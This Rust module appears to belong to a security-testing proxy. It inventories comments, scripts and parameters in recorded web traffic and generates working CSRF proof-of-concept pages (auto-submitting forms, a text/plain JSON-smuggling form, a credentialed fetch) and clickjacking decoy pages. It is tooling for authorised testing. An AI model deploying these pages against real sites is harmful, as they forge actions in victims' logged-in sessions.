//! Engagement tools over recorded traffic (nothing is sent): comments and
//! scripts left in pages, the parameters a target uses, and proof-of-concept
//! pages for CSRF and clickjacking.

use std::collections::BTreeMap;

use regex::Regex;
use serde::Serialize;

const MAX_PER_BODY: usize = 500;
const MAX_TEXT: usize = 300;

fn clip(s: &str) -> String {
    let s = s.trim();
    if s.chars().count() <= MAX_TEXT {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(MAX_TEXT).collect::<String>())
    }
}

fn line_of(text: &str, at: usize) -> usize {
    text[..at.min(text.len())].bytes().filter(|&b| b == b'\n').count() + 1
}

fn re(p: &str) -> Regex {
    Regex::new(p).expect("static regex")
}

/// What kind of text a body is, from its content type (or a sniff).
pub fn kind_of(content_type: &str, body: &str) -> Option<&'static str> {
    let ct = content_type.to_ascii_lowercase();
    if ct.contains("html") || (ct.is_empty() && body.trim_start().starts_with('<')) {
        Some("html")
    } else if ct.contains("javascript") || ct.contains("ecmascript") {
        Some("js")
    } else if ct.contains("css") {
        Some("css")
    } else {
        None
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Comment {
    /// "html", "js" or "css".
    pub kind: &'static str,
    pub text: String,
    pub line: usize,
}

/// Comments in a body: HTML comments, and JavaScript/CSS comments (in
/// scripts and style sheets, including inline ones in HTML).
pub fn find_comments(content_type: &str, body: &str) -> Vec<Comment> {
    let mut out = Vec::new();
    match kind_of(content_type, body) {
        Some("html") => {
            for m in re(r"(?s)<!--(.*?)-->").captures_iter(body) {
                let g = m.get(1).expect("group");
                let text = clip(g.as_str());
                if !text.is_empty() {
                    out.push(Comment { kind: "html", text, line: line_of(body, g.start()) });
                }
            }
            for m in re(r"(?is)<script\b[^>]*>(.*?)</script>").captures_iter(body) {
                let g = m.get(1).expect("group");
                for mut c in code_comments(g.as_str(), "js") {
                    c.line += line_of(body, g.start()) - 1;
                    out.push(c);
                }
            }
            for m in re(r"(?is)<style\b[^>]*>(.*?)</style>").captures_iter(body) {
                let g = m.get(1).expect("group");
                for mut c in code_comments(g.as_str(), "css") {
                    c.line += line_of(body, g.start()) - 1;
                    out.push(c);
                }
            }
        }
        Some(k @ ("js" | "css")) => out = code_comments(body, k),
        _ => {}
    }
    out.truncate(MAX_PER_BODY);
    out
}

/// `/* … */` and (JavaScript) `// …` comments outside string literals.
fn code_comments(code: &str, kind: &'static str) -> Vec<Comment> {
    let b = code.as_bytes();
    let mut out = Vec::new();
    let (mut i, mut line) = (0usize, 1usize);
    let mut quote: Option<u8> = None;
    while i < b.len() && out.len() < MAX_PER_BODY {
        let c = b[i];
        if c == b'\n' {
            line += 1;
        }
        if let Some(q) = quote {
            if c == b'\\' {
                i += 2;
                continue;
            }
            if c == q || (c == b'\n' && q != b'`') {
                quote = None;
            }
            i += 1;
            continue;
        }
        match c {
            b'"' | b'\'' | b'`' => quote = Some(c),
            b'/' if b.get(i + 1) == Some(&b'*') => {
                let end = code[i + 2..].find("*/").map_or(b.len(), |e| i + 2 + e);
                let text = clip(&code[i + 2..end]);
                if !text.is_empty() {
                    out.push(Comment { kind, text, line });
                }
                line += code[i..end].bytes().filter(|&x| x == b'\n').count();
                i = end + 2;
                continue;
            }
            b'/' if kind == "js" && b.get(i + 1) == Some(&b'/') => {
                let end = code[i..].find('\n').map_or(b.len(), |e| i + e);
                let text = clip(&code[i + 2..end]);
                if !text.is_empty() {
                    out.push(Comment { kind, text, line });
                }
                i = end;
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    out
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Script {
    /// "external", "inline" or "handler" (an on… attribute).
    pub kind: &'static str,
    /// The `src` of an external script.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub src: Option<String>,
    /// The start of an inline script or handler.
    pub snippet: String,
    pub length: usize,
    pub line: usize,
}

/// Scripts in an HTML page: external ones, inline ones and event handlers.
pub fn find_scripts(html: &str) -> Vec<Script> {
    let mut out = Vec::new();
    let src = re(r#"(?i)\bsrc\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#);
    for m in re(r"(?is)<script\b([^>]*)>(.*?)</script>").captures_iter(html) {
        let attrs = m.get(1).map_or("", |g| g.as_str());
        let code = m.get(2).expect("group");
        let line = line_of(html, m.get(0).expect("match").start());
        if let Some(s) = src.captures(attrs) {
            let url = s.get(1).or(s.get(2)).or(s.get(3)).map_or("", |g| g.as_str());
            out.push(Script { kind: "external", src: Some(url.to_string()), snippet: String::new(), length: 0, line });
        } else if !code.as_str().trim().is_empty() {
            out.push(Script {
                kind: "inline",
                src: None,
                snippet: clip(code.as_str()),
                length: code.as_str().len(),
                line,
            });
        }
    }
    let handler = re(r#"(?i)\s(on[a-z]+)\s*=\s*(?:"([^"]*)"|'([^']*)')"#);
    for m in handler.captures_iter(html) {
        let code = m.get(2).or(m.get(3)).map_or("", |g| g.as_str());
        let name = m.get(1).map_or("", |g| g.as_str());
        out.push(Script {
            kind: "handler",
            src: None,
            snippet: clip(&format!("{name}=\"{code}\"")),
            length: code.len(),
            line: line_of(html, m.get(0).expect("match").start()),
        });
        if out.len() >= MAX_PER_BODY {
            break;
        }
    }
    out
}

/// Where a parameter was found.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub enum ParamWhere {
    #[serde(rename = "query")]
    Query,
    #[serde(rename = "body")]
    Form,
    #[serde(rename = "json")]
    Json,
    #[serde(rename = "cookie")]
    Cookie,
    #[serde(rename = "multipart")]
    Multipart,
}

/// The parameters in a raw HTTP/1.x request: query, form or multipart body
/// fields, top-level JSON keys, and cookies.
pub fn request_params(raw: &[u8]) -> Vec<(ParamWhere, String, String)> {
    let mut out = Vec::new();
    let (head, body) = pm_http::split_message(raw);
    let Ok(h) = pm_http::parse_request_head(head) else { return out };
    let target = pm_http::split_absolute_target(&h.target).map_or(h.target.as_str(), |(_, _, p)| p);
    if let Some((_, q)) = target.split_once('?') {
        for (k, v) in form_pairs(q) {
            out.push((ParamWhere::Query, k, v));
        }
    }
    if let Some(c) = pm_http::header(&h.headers, "cookie") {
        for pair in String::from_utf8_lossy(c).split(';') {
            if let Some((k, v)) = pair.split_once('=') {
                out.push((ParamWhere::Cookie, k.trim().to_string(), v.trim().to_string()));
            }
        }
    }
    let ct = pm_http::header(&h.headers, "content-type").map(|v| String::from_utf8_lossy(v).to_ascii_lowercase());
    let text = String::from_utf8_lossy(body);
    match ct.as_deref() {
        Some(c) if c.contains("x-www-form-urlencoded") => {
            for (k, v) in form_pairs(&text) {
                out.push((ParamWhere::Form, k, v));
            }
        }
        Some(c) if c.contains("json") => {
            if let Ok(serde_json::Value::Object(o)) = serde_json::from_slice::<serde_json::Value>(body) {
                for (k, v) in o {
                    let v = match v {
                        serde_json::Value::String(s) => s,
                        other => other.to_string(),
                    };
                    out.push((ParamWhere::Json, k, v));
                }
            }
        }
        Some(c) if c.contains("multipart/form-data") => {
            for m in re(r#"(?i)content-disposition:\s*form-data;\s*name="([^"]*)""#).captures_iter(&text) {
                out.push((ParamWhere::Multipart, m[1].to_string(), String::new()));
            }
        }
        _ => {}
    }
    out
}

fn pct(s: &str) -> String {
    let b = s.replace('+', " ");
    let b = b.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%'
            && let Some(h) = b.get(i + 1..i + 3).and_then(|h| std::str::from_utf8(h).ok())
            && let Ok(v) = u8::from_str_radix(h, 16)
        {
            out.push(v);
            i += 3;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

pub(crate) fn form_pairs(s: &str) -> Vec<(String, String)> {
    s.split('&')
        .filter(|p| !p.is_empty())
        .map(|p| {
            let (k, v) = p.split_once('=').unwrap_or((p, ""));
            (pct(k), pct(v))
        })
        .collect()
}

/// One parameter across the requests analysed.
#[derive(Debug, Clone, Serialize)]
pub struct ParamSummary {
    pub name: String,
    pub locations: Vec<ParamWhere>,
    /// Requests that sent it.
    pub requests: usize,
    pub distinct_values: usize,
    /// Up to three example values.
    pub examples: Vec<String>,
    /// Up to five paths it was sent to.
    pub paths: Vec<String>,
}

/// Per parameter: locations, requests, distinct values, paths.
type ParamStats = (Vec<ParamWhere>, usize, std::collections::BTreeSet<String>, Vec<String>);

/// Collects parameters across requests (`(path, raw request)`).
#[derive(Default)]
pub struct ParamCollector {
    map: BTreeMap<String, ParamStats>,
}

impl ParamCollector {
    pub fn add(&mut self, path: &str, raw: &[u8]) {
        let bare = path.split('?').next().unwrap_or(path).to_string();
        let mut seen = std::collections::HashSet::new();
        for (w, k, v) in request_params(raw) {
            let e = self.map.entry(k.clone()).or_default();
            if !e.0.contains(&w) {
                e.0.push(w);
            }
            if seen.insert(k) {
                e.1 += 1;
            }
            if e.2.len() < 1000 {
                e.2.insert(v.chars().take(100).collect());
            }
            if e.3.len() < 5 && !e.3.contains(&bare) {
                e.3.push(bare.clone());
            }
        }
    }

    pub fn finish(self) -> Vec<ParamSummary> {
        let mut v: Vec<ParamSummary> = self
            .map
            .into_iter()
            .map(|(name, (mut locations, requests, values, paths))| {
                locations.sort();
                ParamSummary {
                    name,
                    locations,
                    requests,
                    distinct_values: values.len(),
                    examples: values.into_iter().filter(|v| !v.is_empty()).take(3).collect(),
                    paths,
                }
            })
            .collect();
        v.sort_by(|a, b| b.requests.cmp(&a.requests).then_with(|| a.name.cmp(&b.name)));
        v
    }
}

/// Whether a path looks like a static file (not worth testing for input).
pub fn is_static(path: &str) -> bool {
    let bare = path.split(['?', '#']).next().unwrap_or("").to_ascii_lowercase();
    [
        ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map",
        ".webp", ".mp4", ".webm", ".mp3", ".pdf",
    ]
    .iter()
    .any(|e| bare.ends_with(e))
}

fn esc(s: &str) -> String {
    s.replace('&', "&amp;").replace('"', "&quot;").replace('\'', "&#39;").replace('<', "&lt;").replace('>', "&gt;")
}

/// How the CSRF proof-of-concept submits the request.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CsrfTechnique {
    /// Picks one from the request's content type.
    #[default]
    Auto,
    /// An HTML form (GET, or POST url-encoded).
    Form,
    /// A multipart HTML form.
    Multipart,
    /// A text/plain form whose field name carries the body (for JSON).
    TextPlain,
    /// `fetch` with credentials (only works where CORS or no-cors allows it).
    Fetch,
}

/// A page that makes a victim's browser send `raw` to `origin` (e.g.
/// `https://shop.test`). Values are HTML-escaped; the page sends nothing
/// until opened.
pub fn csrf_poc(origin: &str, raw: &[u8], technique: CsrfTechnique, auto_submit: bool) -> Result<String, String> {
    let (head, body) = pm_http::split_message(raw);
    let h = pm_http::parse_request_head(head).map_err(|e| format!("not a request: {e}"))?;
    let target = pm_http::split_absolute_target(&h.target).map_or(h.target.as_str(), |(_, _, p)| p);
    let method = h.method.to_ascii_uppercase();
    let ct = pm_http::header(&h.headers, "content-type")
        .map(|v| String::from_utf8_lossy(v).to_ascii_lowercase())
        .unwrap_or_default();
    let body_text = String::from_utf8_lossy(body).into_owned();
    let technique = match technique {
        CsrfTechnique::Auto if method == "GET" || ct.contains("x-www-form-urlencoded") || body.is_empty() => {
            CsrfTechnique::Form
        }
        CsrfTechnique::Auto if ct.contains("multipart/form-data") => CsrfTechnique::Multipart,
        CsrfTechnique::Auto if ct.contains("json") => CsrfTechnique::TextPlain,
        CsrfTechnique::Auto => CsrfTechnique::Fetch,
        t => t,
    };
    let (path, query) = target.split_once('?').map_or((target, ""), |(p, q)| (p, q));
    let action = format!("{}{}", origin.trim_end_matches('/'), path);
    let inputs = |pairs: Vec<(String, String)>| -> String {
        pairs
            .iter()
            .map(|(k, v)| format!("      <input type=\"hidden\" name=\"{}\" value=\"{}\">\n", esc(k), esc(v)))
            .collect()
    };
    let submit = if auto_submit { "    <script>document.forms[0].submit();</script>\n" } else { "" };
    let note = format!(
        "<!-- CSRF proof of concept made by ProxyMind for {} {}. Open it in a browser logged in to the target. -->\n",
        esc(&method),
        esc(&action)
    );
    let page = match technique {
        CsrfTechnique::Form | CsrfTechnique::Auto => {
            let (form_method, fields, full_action) = if method == "GET" {
                ("GET", form_pairs(query), action.clone())
            } else {
                let act = if query.is_empty() { action.clone() } else { format!("{action}?{query}") };
                ("POST", form_pairs(&body_text), act)
            };
            format!(
                "<!doctype html>\n<html>\n  {note}  <body>\n    <form action=\"{}\" method=\"{form_method}\">\n{}      <input type=\"submit\" value=\"Submit request\">\n    </form>\n{submit}  </body>\n</html>\n",
                esc(&full_action),
                inputs(fields)
            )
        }
        CsrfTechnique::Multipart => {
            let fields: Vec<(String, String)> = multipart_fields(&body_text, &ct);
            let act = if query.is_empty() { action.clone() } else { format!("{action}?{query}") };
            format!(
                "<!doctype html>\n<html>\n  {note}  <body>\n    <form action=\"{}\" method=\"POST\" enctype=\"multipart/form-data\">\n{}      <input type=\"submit\" value=\"Submit request\">\n    </form>\n{submit}  </body>\n</html>\n",
                esc(&act),
                inputs(fields)
            )
        }
        CsrfTechnique::TextPlain => {
            // name + "=" + value makes the body. For a JSON object, a padding
            // key absorbs the "=" so the result is still valid JSON.
            let trimmed = body_text.trim_end();
            let (name, value) = if trimmed.ends_with('}') && trimmed.len() > 1 {
                let inner = &trimmed[..trimmed.len() - 1];
                let sep = if inner.trim_end().ends_with('{') { "" } else { "," };
                (format!("{inner}{sep}\"pm_pad\":\""), "\"}".to_string())
            } else {
                (trimmed.to_string(), String::new())
            };
            let act = if query.is_empty() { action.clone() } else { format!("{action}?{query}") };
            format!(
                "<!doctype html>\n<html>\n  {note}  <!-- Sent as text/plain: works when the server doesn't check Content-Type. -->\n  <body>\n    <form action=\"{}\" method=\"POST\" enctype=\"text/plain\">\n      <input type=\"hidden\" name=\"{}\" value=\"{}\">\n      <input type=\"submit\" value=\"Submit request\">\n    </form>\n{submit}  </body>\n</html>\n",
                esc(&act),
                esc(&name),
                esc(&value)
            )
        }
        CsrfTechnique::Fetch => {
            let url = if query.is_empty() { action.clone() } else { format!("{action}?{query}") };
            let js_str = |s: &str| serde_json::to_string(s).unwrap_or_default().replace("</", "<\\/");
            let call = format!(
                "fetch({}, {{ method: {}, credentials: \"include\", mode: \"no-cors\", headers: {{ \"Content-Type\": \"text/plain\" }}, body: {} }});",
                js_str(&url),
                js_str(&method),
                if body.is_empty() || method == "GET" || method == "HEAD" {
                    "undefined".to_string()
                } else {
                    js_str(&body_text)
                }
            );
            let trigger = if auto_submit {
                format!("    <script>{call}</script>\n")
            } else {
                format!("    <button onclick='{}'>Submit request</button>\n", esc(&call))
            };
            format!(
                "<!doctype html>\n<html>\n  {note}  <!-- fetch with credentials: needs SameSite=None cookies; the response can't be read cross-site. -->\n  <body>\n{trigger}  </body>\n</html>\n"
            )
        }
    };
    Ok(page)
}

pub(crate) fn multipart_fields(body: &str, content_type: &str) -> Vec<(String, String)> {
    let Some(boundary) =
        content_type.split("boundary=").nth(1).map(|b| b.trim_matches('"').split(';').next().unwrap_or("").to_string())
    else {
        return vec![];
    };
    let mut out = Vec::new();
    for part in body.split(&format!("--{boundary}")) {
        let Some((headers, value)) = part.split_once("\r\n\r\n").or_else(|| part.split_once("\n\n")) else { continue };
        let Some(name) = re(r#"(?i)name="([^"]*)""#).captures(headers).map(|c| c[1].to_string()) else { continue };
        if headers.to_ascii_lowercase().contains("filename=") {
            continue; // a file input can't be pre-filled
        }
        out.push((name, value.trim_end_matches("\r\n").trim_end_matches('\n').to_string()));
    }
    out
}

#[derive(Debug, Clone, Serialize)]
pub struct Clickjacking {
    /// Whether the recorded response lets other sites frame it.
    pub framable: bool,
    pub reasons: Vec<String>,
    /// A page that frames the target under a decoy button, with a slider to
    /// show it (to check what a click would hit).
    pub poc: String,
}

/// Checks a response's framing headers and builds a clickjacking test page.
pub fn clickjacking(url: &str, response_head: &[pm_http::Header]) -> Clickjacking {
    let mut reasons = Vec::new();
    let xfo =
        pm_http::header(response_head, "x-frame-options").map(|v| String::from_utf8_lossy(v).to_ascii_lowercase());
    let csp = response_head
        .iter()
        .filter(|h| h.name.eq_ignore_ascii_case("content-security-policy"))
        .map(|h| String::from_utf8_lossy(&h.value).to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join(";");
    let fa = csp.split(';').map(str::trim).find(|d| d.starts_with("frame-ancestors"));
    let mut framable = true;
    if let Some(fa) = fa {
        let sources = fa.trim_start_matches("frame-ancestors").trim();
        if sources == "'none'" || sources == "'self'" || (!sources.contains('*') && !sources.is_empty()) {
            framable = sources.contains('*');
            reasons.push(format!("CSP {fa}"));
        } else {
            reasons.push(format!("CSP {fa} allows other sites"));
        }
    } else if let Some(x) = &xfo {
        if x.contains("deny") || x.contains("sameorigin") {
            framable = false;
            reasons.push(format!("X-Frame-Options: {x}"));
        } else {
            reasons.push(format!("X-Frame-Options: {x} (not understood by browsers)"));
        }
    } else {
        reasons.push("no X-Frame-Options and no CSP frame-ancestors".into());
    }
    let u = esc(url);
    let poc = format!(
        r#"<!doctype html>
<html>
  <!-- Clickjacking test page made by ProxyMind for {u}. Move the decoy over the button to hijack, then lower the opacity. -->
  <head>
    <style>
      body {{ font-family: sans-serif; }}
      #target {{ position: absolute; top: 80px; left: 10px; width: 1000px; height: 700px; opacity: 0.5; z-index: 2; border: 0; }}
      #decoy {{ position: absolute; top: 300px; left: 300px; z-index: 1; padding: 12px 24px; background: #2563eb; color: #fff; }}
    </style>
  </head>
  <body>
    <label>Target opacity <input type="range" min="0" max="1" step="0.05" value="0.5" oninput="document.getElementById('target').style.opacity=this.value"></label>
    <label>Decoy top <input type="number" value="300" oninput="document.getElementById('decoy').style.top=this.value+'px'"></label>
    <label>left <input type="number" value="300" oninput="document.getElementById('decoy').style.left=this.value+'px'"></label>
    <div id="decoy">Click here to win</div>
    <iframe id="target" src="{u}"></iframe>
  </body>
</html>
"#
    );
    Clickjacking { framable, reasons, poc }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn comments_in_html_scripts_and_styles() {
        let html = "<html>\n<!-- TODO remove admin link -->\n<script>\nvar u = \"http://x/y\"; // api key is in config.js\n/* old endpoint: /api/v1/debug */\n</script>\n<style>/* theme */</style>";
        let c = find_comments("text/html", html);
        let texts: Vec<&str> = c.iter().map(|c| c.text.as_str()).collect();
        assert_eq!(
            texts,
            ["TODO remove admin link", "api key is in config.js", "old endpoint: /api/v1/debug", "theme"]
        );
        assert_eq!(c[0].line, 2);
        assert_eq!(c[1].line, 4);
        assert!(find_comments("application/javascript", "let s = '// not a comment';").is_empty());
        assert!(find_comments("image/png", "<!-- x -->").is_empty());
    }

    #[test]
    fn scripts_are_listed() {
        let html = r#"<script src="/app.js"></script><script>init({debug:true})</script><button onclick="go('x')">"#;
        let s = find_scripts(html);
        assert_eq!(s.iter().map(|s| s.kind).collect::<Vec<_>>(), ["external", "inline", "handler"]);
        assert_eq!(s[0].src.as_deref(), Some("/app.js"));
    }

    #[test]
    fn params_are_found_everywhere() {
        let raw = b"POST /api/x?page=2&q=a%20b HTTP/1.1\r\nCookie: sid=1; theme=dark\r\nContent-Type: application/json\r\n\r\n{\"id\":7,\"name\":\"n\"}";
        let p = request_params(raw);
        assert!(p.contains(&(ParamWhere::Query, "q".into(), "a b".into())));
        assert!(p.contains(&(ParamWhere::Cookie, "sid".into(), "1".into())));
        assert!(p.contains(&(ParamWhere::Json, "id".into(), "7".into())));
        let mut c = ParamCollector::default();
        c.add("/api/x?page=2", raw);
        c.add("/api/y", b"GET /api/y?page=3 HTTP/1.1\r\n\r\n");
        let page = c.finish().into_iter().find(|p| p.name == "page").unwrap();
        assert_eq!((page.requests, page.distinct_values, page.paths.len()), (2, 2, 2));
    }

    #[test]
    fn csrf_pocs_escape_and_submit() {
        let form = b"POST /account/email?x=1 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=a%40b.c&note=%22%3E%3Cscript%3E";
        let html = csrf_poc("https://shop.test", form, CsrfTechnique::Auto, true).unwrap();
        assert!(html.contains(r#"<form action="https://shop.test/account/email?x=1" method="POST">"#), "{html}");
        assert!(html.contains(r#"name="email" value="a@b.c""#));
        assert!(html.contains("&quot;&gt;&lt;script&gt;"), "values are escaped: {html}");
        assert!(html.contains("document.forms[0].submit()"));

        let json =
            b"POST /api/transfer HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"to\":\"eve\",\"amount\":100}";
        let html = csrf_poc("https://bank.test", json, CsrfTechnique::Auto, false).unwrap();
        assert!(html.contains(r#"enctype="text/plain""#));
        // name + "=" + value is valid JSON.
        let name = r#"{"to":"eve","amount":100,"pm_pad":""#;
        let sent = format!("{name}=\"}}");
        assert!(serde_json::from_str::<serde_json::Value>(&sent).is_ok(), "{sent}");

        let get = b"GET /delete?id=5 HTTP/1.1\r\n\r\n";
        assert!(csrf_poc("http://a.test", get, CsrfTechnique::Auto, false).unwrap().contains(r#"method="GET""#));
        assert!(csrf_poc("http://a.test", get, CsrfTechnique::Fetch, true).unwrap().contains("credentials"));
    }

    #[test]
    fn framing_headers_decide() {
        let h = |n: &str, v: &str| pm_http::Header { name: n.into(), value: v.as_bytes().to_vec() };
        assert!(clickjacking("https://a.test/", &[]).framable);
        assert!(!clickjacking("https://a.test/", &[h("X-Frame-Options", "DENY")]).framable);
        assert!(
            !clickjacking(
                "https://a.test/",
                &[h("Content-Security-Policy", "default-src 'self'; frame-ancestors 'none'")]
            )
            .framable
        );
        assert!(clickjacking("https://a.test/", &[h("X-Frame-Options", "ALLOW-FROM https://x")]).framable);
        assert!(clickjacking("https://a.test/\"><x>", &[]).poc.contains("&quot;&gt;&lt;x&gt;"));
    }
}
